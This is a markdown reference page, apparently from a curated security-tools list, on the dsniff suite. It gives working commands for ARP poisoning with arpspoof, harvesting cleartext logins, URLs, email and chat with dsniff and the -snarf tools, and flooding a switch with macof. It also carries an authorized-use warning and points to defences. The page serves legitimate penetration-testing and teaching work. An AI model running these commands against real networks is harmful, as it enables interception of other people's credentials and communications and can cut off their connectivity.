# dsniff Suite & arpspoof

> The classic 1990s toolkit that made LAN sniffing famous: `arpspoof` to redirect
> traffic through you, and a family of small tools that pluck passwords, files,
> and sessions straight off the wire.

- **Link:** https://github.com/tecknicaltom/dsniff (original: https://www.monkey.org/~dugsong/dsniff/)
- **Type:** open source
- **Platform:** Linux

## Description

dsniff is a collection of purpose-built network auditing and penetration-testing
tools by Dug Song. The suite predates modern all-in-one MITM frameworks like
[Ettercap/Bettercap](ettercap-bettercap.md), but the individual utilities are
still handy and instructive: each does exactly one thing. `arpspoof` poisons ARP
caches to put you in the path between two hosts; `dsniff` then passively harvests
cleartext credentials from dozens of protocols; `urlsnarf`, `mailsnarf`, and
`msgsnarf` log URLs, email, and chat; and `macof` floods a switch's CAM table to
force it to fail open. Everything here is for **authorized** testing only —
intercepting traffic you aren't permitted to touch is illegal.

## Installation

```bash
sudo apt install dsniff        # Debian/Kali/Ubuntu (ships the whole suite)
```

## Usage examples

### arpspoof — get in the middle

```bash
# Enable IP forwarding first, or you DoS the victim instead of relaying
sudo sysctl -w net.ipv4.ip_forward=1

# Poison the victim: tell 192.168.1.50 that you are the gateway (.1)
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Poison the other direction too (in a second terminal) for full bidirectional MITM
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
```

### dsniff & the -snarf tools — harvest from the intercepted traffic

```bash
# Passively grab cleartext logins (FTP, Telnet, HTTP, POP, IMAP, SNMP, ...)
sudo dsniff -i eth0

# Log every HTTP URL the victim visits
sudo urlsnarf -i eth0

# Reconstruct email (SMTP/POP/IMAP) and instant messages seen on the wire
sudo mailsnarf -i eth0
sudo msgsnarf -i eth0
```

### macof — CAM-table overflow

```bash
# Flood the switch with random MACs so it floods traffic to all ports (fail-open)
sudo macof -i eth0
```

## Notes & references

- **Legacy / not actively maintained:** dsniff has seen no real development since
  the early 2000s. It's kept here as the instructive original — for modern MITM
  work reach for [Ettercap/Bettercap](ettercap-bettercap.md).
- **Set `ip_forward=1` before arpspoofing**, or the victim loses connectivity —
  that's a denial of service, not a man-in-the-middle.
- The same ARP-poisoning primitive can be scripted with [Scapy](scapy.md) or run
  from the more modern [Ettercap/Bettercap](ettercap-bettercap.md).
- Capture the redirected traffic with [tcpdump](tcpdump.md) and analyse it in
  [Wireshark](wireshark.md); carve credentials/files with
  [NetworkMiner](networkminer.md).
- These attacks only work against cleartext protocols; they're a strong argument
  for TLS everywhere. Detection/defence (dynamic ARP inspection, port security)
  lives in [../defense-blueteam/](../defense-blueteam/).
